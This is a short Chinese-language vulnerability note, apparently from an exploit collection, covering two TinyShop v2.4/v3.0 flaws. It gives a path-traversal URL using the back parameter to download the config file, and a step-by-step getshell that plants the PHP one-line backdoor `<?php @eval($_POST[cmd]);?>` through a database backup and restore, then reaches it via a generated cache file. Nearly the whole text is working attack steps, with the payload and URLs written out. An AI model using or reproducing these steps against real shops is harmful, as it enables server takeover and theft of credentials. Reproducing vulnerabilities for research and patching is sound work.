## TinyShop v2.4 任意文件读取漏洞

- 测试方法

  进入后台->系统设置->数据库管理->数据库备份

  备份任意数据库后访问链接

  `http://localhost/tinyshop/index.php?con=admin&act=down&back=../../protected/config/config.php`

  即可通过back参数下载任意文件

  ​

- 漏洞详情参考

  http://www.freebuf.com/vuls/161409.html

## TinyShop v2.4 v3.0 缓存getshell

- 测试方法

  1.进入后台->内容管理->全部帮助，选择任意一条记录，编辑该记录，在其内容中添加一句话后门代码`<?php @eval($_POST[cmd]);?>`并保存

  2.备份数据库中的帮助表，在“系统设置”-“数据库备份” 数据库表中选择包含help的表，在本例中为tiny_help的表，选择后在数据库备份中进行备份。

  3.下载备份的数据库表sql文件，将其中的一句话代码被html转义的部分修改回原样

  4.在“系统设置”-“数据库还原”-“导入”，选择已经修改过的sql文件，选择“上传”，文件上传后会自动还原数据库。     

  5.清理缓存，单击“系统设置”-“安全管理”-“清除缓存”，选择清除所有缓存。

  6.访问页面，在浏览器中随机访问其帮助文件中的列表来生成缓存，例如“用户注册协议”的地址：

  `http://192.168.127.130/tinyshop_2.x/index.php?con=index&act=help&id=14`

  7.访问对应缓存文件获取shell

  `http://192.168.127.130/tinyshop_2.x/cache/368/501/4461.php`


- 漏洞详情参考

  http://www.freebuf.com/vuls/161409.html